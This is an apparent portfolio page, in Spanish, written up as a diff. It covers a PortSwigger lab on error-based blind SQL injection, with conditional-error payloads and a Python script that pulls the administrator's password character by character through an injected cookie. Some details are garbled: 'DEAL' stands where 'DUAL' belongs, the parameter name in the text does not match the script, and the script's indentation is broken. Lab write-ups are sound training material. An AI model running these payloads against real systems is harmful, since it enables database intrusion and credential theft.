@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Blind SQLi — Error Based | MeloRZ</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Exo+2:wght@300;400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/style.css"/>
+</head>
+<body>
+  <div class="bg-grid"></div>
+  <nav class="navbar">
+    <div class="nav-brand"><span class="bracket">[</span><span class="brand-name">MeloRZ</span><span class="bracket">]</span></div>
+    <ul class="nav-links">
+      <li><a href="../../index.html#writeups" class="nav-link">← Writeups</a></li>
+    </ul>
+    <div class="nav-status"><span class="status-dot"></span><span class="status-text">ONLINE</span></div>
+  </nav>
+  <div class="writeup-page">
+    <a href="../../index.html" class="writeup-back">← Volver al portafolio</a>
+    <div class="writeup-header">
+      <div class="writeup-meta">
+        <span class="card-badge ps">PS Lab</span>
+        <span class="card-difficulty easy">EASY</span>
+      </div>
+      <h1 class="writeup-title">Blind SQLi — Error Based</h1>
+      <div class="writeup-info">
+        <span>Plataforma: <strong style="color:var(--blue-bright)">PortSwigger Labs</strong></span>
+        <span>Tags: <span>SQLi</span><span>Blind</span><span>Error</span></span>
+      </div>
+    </div>
+    <div class="writeup-body">
+
+
+<p>En este  tipo de <strong>SQL blind</strong> nos aprovechamos de errores que podemos inducir en una query dependiendo del resultado</p>
+
+<p>EJ:</p>
+
+<pre><code>xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'A' END)='A-- -</code></pre>
+<p>esta query evalúa que la condición sea verdadera, si es verdadera causa un error al querer dividir entre 0, si es falsa devuelve <code>A</code></p>
+
+
+<hr>
+
+
+<h2>Lab Portswigger </h2>
+
+<p>ya una vez verificada la VULN en la QUERY <strong>PHPSSESID</strong> vamos a explotarla con este metodo.</p>
+
+
+<em>[imagen]</em>
+
+
+<p>como podemos ver con el siguiente paylaod salta un error ya que la condición <em>1=1</em> es verdadera y se realiza la operacion <code>1/0</code> que da error:</p>
+
+<pre><code>qSfTAstSycf1i74I' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM DEAL)</code></pre>
+
+<p>Por lo tanto podemos construir la siguiente QUERY y aprovecharnos de cuando da error para saber lo que devuelve la QUERY</p>
+
+<pre><code>qSfTAstSycf1i74I' AND (SELECT CASE WHEN (SUBSTRING(password,1,1))='letter' THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator')</code></pre>
+
+<p>y hacemos el siguiente <strong>SCRIPT</strong> para automatizar:</p>
+<pre><code>#!/usr/bin/python3
+<p>import requests</p>
+<p>import string</p>
+
+
+
+
+<p>url_input= 'https://0aec0049046e151780ed08e400fa00af.web-security-academy.net/'</p>
+<p>caracters= string.ascii_lowercase + string.ascii_uppercase + string.digits</p>
+<p>password= ''</p>
+
+<p>for position in range(1,21):</p>
+<p>for letter in caracters:</p>
+
+<p>cookies = {"TrackingId":f"60r9V6o2thyHQdVW' || (SELECT CASE WHEN SUBSTR(password,{position},1)='{letter}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '","session":"cZ88aG3WPV5wkPFGgl0LFlRuHKdjiGnC"}</p>
+<p>me_request = requests.get(url=url_input, cookies=cookies)</p>
+<p>if 'Internal Server Error' in me_request.text:</p>
+<p>password+=letter</p>
+<p>print(f"letra de la posicion {position} encontrada --> {letter}")</p>
+<p>break</p>
+<p>print(" -->", password)</code></pre></p>
+
+
+    </div>
+  </div>
+</body>
+</html>
